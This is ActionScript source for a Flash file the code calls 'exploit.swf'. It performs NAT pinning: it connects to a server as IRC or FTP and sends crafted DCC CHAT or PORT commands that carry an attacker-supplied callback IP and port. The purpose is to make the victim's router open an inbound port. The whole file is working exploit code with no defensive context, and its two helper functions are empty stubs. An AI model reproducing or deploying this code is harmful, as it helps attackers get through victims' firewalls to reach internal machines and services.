//as3compile exploit.as -o exploit.swf
package {
	import flash.display.MovieClip;
	import flash.net.Socket;
	import flash.events.*;
	import flash.system.Security;
	import flash.external.*; 
	
	public class Main extends MovieClip {
		static var socket:Socket
		var sServer:String
		var iServerPort:int
		var sType:String
		var sCallbackPort:String
		var sCallbackIP:String

      		function Main() {
		        
			socket = new Socket();

			socket.addEventListener(Event.CONNECT, onConnect);
			socket.addEventListener(Event.CLOSE, onClose);
			socket.addEventListener(IOErrorEvent.IO_ERROR, onError);
			socket.addEventListener(ProgressEvent.SOCKET_DATA, onResponse);
			socket.addEventListener(SecurityErrorEvent.SECURITY_ERROR, onSecError);


			//get external vars
			sServer= root.loaderInfo.parameters.server as String;
			sType= root.loaderInfo.parameters.type as String;
			sCallbackPort = root.loaderInfo.parameters.cp as String;
			sCallbackIP = root.loaderInfo.parameters.ci as String;
			if (sType !=null){
				if (sType.toUpperCase()=="IRC"){iServerPort = 6667;}
				if (sType.toUpperCase()=="FTP"){iServerPort = 21;}
			}
			socket.connect(sServer, iServerPort);		
		}
		function onConnect(e:Event):void {
			trace("connected")
		}

		function onClose(e:Event):void {
			// Security error is thrown if this line is excluded
			socket.close();
		}

		function onError(e:IOErrorEvent):void {
			trace("IO Error: "+e);
		}

		function onSecError(e:SecurityErrorEvent):void {
			trace("Security Error: "+e);
		}

		function onResponse(e:ProgressEvent):void {
			if (socket.bytesAvailable>0) {
				var data:String = socket.readUTFBytes(socket.bytesAvailable)
				trace(data)
				if(sType.toUpperCase()=="IRC"){
						trace("IRC: " + data)
						// init
						if (data.indexOf("NOTICE")>0){socket.writeUTFBytes("NICK natpin\r\nUSER natpin natpin 127.0.0.1:natpin\r\n")}
						//end of motd
						if (data.indexOf("376")>0){socket.writeUTFBytes("PRIVMSG natpinserver :\1DCC CHAT chat "+sCallbackIP+" "+ sCallbackPort+"\1\r\n")}
				}
				if(sType.toUpperCase()=="FTP"){
						//HELLO
						trace("FTP: " + data)
						data = data.substr(0,3)
						if (data=="220"){socket.writeUTFBytes("USER anonymous\r\n")}
						if (data=="331"){socket.writeUTFBytes("PASS natpin@work.net\r\n")}
						//logged in
						if (data=="230"){
							socket.writeUTFBytes("PORT " + sCallbackIP + "," + sCallbackPort + "\r\n")}
						if (data=="200"){
							//port command succesfull, send list command
							socket.writeUTFBytes("LIST\r\n")}
						else{
							trace("FTP invalid response: " + data)
						}
				}
			}
		}

		function calcFTP(port,ip):String{
		}
		function calcIRC(port,ip):String{
		}
	}
}
